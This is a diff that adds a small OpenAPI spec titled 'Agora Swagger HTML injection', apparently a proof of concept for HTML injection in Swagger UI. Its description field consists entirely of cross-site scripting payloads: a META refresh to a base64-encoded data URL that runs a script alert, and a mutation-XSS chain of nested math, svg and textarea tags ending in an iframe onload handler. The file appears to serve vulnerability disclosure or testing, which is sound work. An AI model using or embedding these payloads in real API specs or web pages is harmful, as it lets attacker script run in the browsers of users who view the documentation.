@@ -1,0 +1,7 @@
+openapi: "3.0.0"
+
+info:
+  title: Agora Swagger HTML injection
+  description:
+    <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+    xss<math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(document.domain)'>"></a></textarea></mtext></svg></mglyph></table></mi></math>
